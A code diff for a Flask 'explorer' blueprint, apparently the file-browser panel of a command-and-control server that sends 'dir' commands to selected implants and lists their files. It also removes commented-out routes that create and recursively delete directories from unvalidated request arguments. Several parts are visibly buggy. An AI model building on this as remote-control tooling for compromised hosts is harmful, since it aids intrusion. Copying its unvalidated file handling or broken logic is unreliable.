@@ -14,7 +14,7 @@ from wtforms import HiddenField
 explorer = Blueprint('explorer', __name__, template_folder='templates', static_folder='static')
 
 class Menu(FlaskForm):
-    selected_implant = HiddenField('Selected Implant')
+    selected_implant = SelectField('Select Implant', choices=[])
 
 
 # handle root route
@@ -22,15 +22,21 @@ class Menu(FlaskForm):
 def root():
     if 'authenticated' not in session or not session['authenticated']:
         return redirect(url_for('basic.login_success'))
+    implant_id = "slayyy"
     implants = get_list()
-    Menu = Menu()
-    form = Terminal
-    form.cmd.data = 'dir'
-    implant_id = form.selected_implant.data
-    return render_template( 'explorer.html', '.', form=Menu, implants=implants,
-         file_list=analyze_input(form, implant_id)) 
+    menu = Menu()
+    menu.selected_implant.choices = implants
+    form = Terminal()
+    if menu.validate_on_submit():
+        form.cmd.data = 'dir'
+        try:
+            implant_id = menu.selected_implant.data
+            #file_list = new(implant_id, form)
+        except AttributeError:
+            implant_id = "slayyy"
+    return render_template('explorer.html', current_working_directory='.', form=Menu,
+         file_list=analyze_input(form, implant_id), implants=implants, implant_id=implant_id) 
 
-'''   
 # handle 'cd' command
 @explorer.route('/cd')
 def cd():
@@ -40,25 +46,14 @@ def cd():
     # redirect to file manager
     return redirect('/explorer')
 
-# handle 'make directory' command
-@explorer.route('/md')
-def md():
-    # create new folder
-    os.mkdir(request.args.get('folder'))
+# view text files
+@explorer.route('/new', methods=['POST'])
+def new(implant_id, form):
+    # get the file content
+    form.cmd.data = 'dir'
+    reposense = analyze_input(form, implant_id)
+    return reposense
     
-    # redirect to fole manager
-    return redirect('/explorer')
-
-# handle 'make directory' command
-@explorer.route('/rm')
-def rm():
-    # remove certain directory
-    shutil.rmtree(os.getcwd() + '/' + request.args.get('dir'))
-    
-    # redirect to fole manager
-    return redirect('/explorer')
-    
-''' 
 # view text files
 @explorer.route('/view')
 def view():
